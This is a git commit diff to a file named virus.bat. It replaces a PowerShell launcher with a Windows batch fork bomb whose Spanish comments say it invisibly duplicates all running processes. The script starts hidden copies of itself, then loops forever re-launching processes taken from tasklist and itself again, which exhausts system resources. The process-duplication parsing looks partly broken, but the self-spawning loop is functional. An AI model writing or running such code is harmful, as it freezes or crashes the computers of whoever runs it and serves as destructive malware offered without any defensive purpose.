0e7b60a5bbe9480988e6367c0044df7b4e678ac2
AnthonyGrullonA <anthonygrulon283@gmail.com>
2026-04-12 22:05:14 -0400

    otroma

--- virus.bat
+++ virus.bat
@@ -1,3 +1,23 @@
 @echo off
-powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0core.ps1"
-pause
+REM ========================================
+REM DUPLICA 100% PROCESOS REALES - INVISIBLE
+REM ========================================
+if "%1"=="H" goto :H
+
+REM SPAWN INVISIBLE
+start /b cmd /c "%~f0" H
+start /b cmd /c "%~f0" H
+start /b cmd /c "%~f0" H
+exit /b
+
+:H
+:duplicar
+REM LEE Y DUPLICA TODOS LOS PROCESOS
+for /f "tokens=1" %%i in ('tasklist /fo table ^| findstr /v "=== cmd conhost"') do (
+    for /f "tokens=2" %%p in ("%%i") do (
+        start /b %%p 2>nul
+    )
+)
+REM SELF DUPLICATE
+start /b "%~f0" H
+goto duplicar
